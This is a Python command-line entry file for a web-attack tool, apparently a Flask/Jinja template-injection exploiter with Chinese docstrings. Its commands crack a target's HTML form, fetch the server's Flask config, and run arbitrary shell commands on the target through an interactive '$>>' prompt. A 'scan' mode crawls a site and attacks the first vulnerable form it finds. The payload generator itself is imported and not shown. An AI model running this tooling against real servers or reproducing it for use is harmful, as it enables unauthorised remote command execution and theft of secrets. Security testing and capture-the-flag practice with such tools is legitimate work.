"""命令行界面的入口

"""

import logging
from urllib.parse import urlparse
from typing import Callable, List, Dict
from functools import partial

import click


from .form import get_form
from .form_cracker import FormCracker
from .full_payload_gen import FullPayloadGen
from .scan_url import yield_form
from .requester import Requester
from .const import (
    OS_POPEN_READ,
    DEFAULT_USER_AGENT,
    CONFIG,
    DETECT_MODE_ACCURATE,
)
from .colorize import colored
from .webui import main as webui_main

TITLE = colored(
    "yellow",
    r"""
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ /
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
              /___/        /____/
""".strip(
        "\n"
    ),
    bold=True,
)
LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"

logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
logger = logging.getLogger("cli")


def cmd_exec(
    cmd: str,
    cracker: FormCracker,
    field: str,
    full_payload_gen: FullPayloadGen,
):
    """在目标上执行命令并返回回显

    Args:
        cmd (str): 命令
        cracker (FormCracker): 目标表格对应的FormCracker
        field (str): 提交到的目标项
        full_payload_gen (FullPayloadGen): payload生成器

    Returns:
        str: 回显
    """
    payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
    logger.info("Submit payload %s", colored("blue", payload))
    if not will_print:
        payload_wont_print = (
            "Payload generator says that this "
            + "payload %s command execution result."
        )
        logger.warning(payload_wont_print, colored("red", "won't print"))
    resp = cracker.submit({field: payload})
    assert resp is not None
    return resp.text


def interact(cmd_exec_func: Callable):
    """根据提供的payload生成方法向用户提供一个交互终端

    Args:
        cmd_exec_func (Callable): 根据输入的shell命令生成对应的payload
    """
    logger.info("Use %s to exit.", colored("cran", "Ctrl+D", bold=True))
    while True:
        try:
            cmd = input("$>> ")
        except EOFError:
            break
        except KeyboardInterrupt:
            break
        result = cmd_exec_func(cmd)
        print(result)


def parse_headers_cookies(
    headers_list: List[str], cookies: str
) -> Dict[str, str]:
    headers = {}
    if headers_list:
        for header in headers_list:
            k, _, v = header.partition(": ")
            if not k or not v:
                logger.warning(f"Failed parsing {repr(header)}, ignored.")
                continue
            if k.capitalize() != k:
                logger.warning(f"Header {k} is not capitalized, fixed.")
                k = k.capitalize()
            headers[k] = v
    if cookies:
        headers["Cookie"] = cookies
    return headers


@click.group()
def main():
    """click的命令组"""


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option(
    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
)
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
def get_config(
    url: str,
    action: str,
    method: str,
    inputs: str,
    interval: float,
    detect_mode: str,
    user_agent: str,
    header: tuple,
    cookies: str,
):
    """
    攻击指定的表单，并获得目标服务器的flask config
    """
    print(TITLE)
    assert all(
        param is not None for param in [url, inputs]
    ), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(
            headers_list=list(header), cookies=cookies
        ),
    )
    cracker = FormCracker(
        url=url, form=form, requester=requester, detect_mode=detect_mode
    )
    result = cracker.crack()
    if result is None:
        logger.warning("Test form failed...")
        return
    full_payload_gen, field = result
    payload = full_payload_gen.generate(CONFIG)
    resp = cracker.submit({field: payload})

    print(resp.text if resp is not None else None)
    logger.warning("Bye!")


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option(
    "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
)
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option(
    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
)
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
def crack(
    url: str,
    action: str,
    method: str,
    inputs: str,
    exec_cmd: str,
    interval: float,
    detect_mode: str,
    user_agent: str,
    header: tuple,
    cookies: str,
):
    """
    攻击指定的表单
    """
    print(TITLE)
    assert all(
        param is not None for param in [url, inputs]
    ), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(
            headers_list=list(header), cookies=cookies
        ),
    )
    cracker = FormCracker(
        url=url, form=form, requester=requester, detect_mode=detect_mode
    )
    result = cracker.crack()
    if result is None:
        logger.warning("Test form failed...")
        return
    full_payload_gen, field = result
    cmd_exec_func = partial(
        cmd_exec,
        cracker=cracker,
        field=field,
        full_payload_gen=full_payload_gen,
    )
    if exec_cmd == "":
        interact(cmd_exec_func)
    else:
        print(cmd_exec_func(exec_cmd))
    logger.warning("Bye!")


@main.command()
@click.option("--url", "-u", help="需要扫描的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="检测模式，可为accurate或fast"
)
@click.option(
    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
)
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
def scan(url, exec_cmd, interval, detect_mode, user_agent, header, cookies):
    """
    扫描指定的网站
    """
    print(TITLE)
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(
            headers_list=list(header), cookies=cookies
        ),
    )
    for page_url, forms in yield_form(requester, url):
        for form in forms:
            cracker = FormCracker(
                url=page_url,
                form=form,
                requester=requester,
                detect_mode=detect_mode,
            )
            result = cracker.crack()
            if result is None:
                continue
            full_payload_gen, field = result
            cmd_exec_func = partial(
                cmd_exec,
                cracker=cracker,
                field=field,
                full_payload_gen=full_payload_gen,
            )
            if exec_cmd == "":
                interact(cmd_exec_func)
            else:
                print(cmd_exec_func(exec_cmd))
            return
    logger.warning("Scan failed...")


@main.command()
@click.option(
    "--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1"
)
@click.option("--port", "-p", default=11451, help="需要监听的端口, 默认为11451")
def webui(host, port):
    """
    启动webui
    """
    webui_main(host, port)


if __name__ == "__main__":
    main()
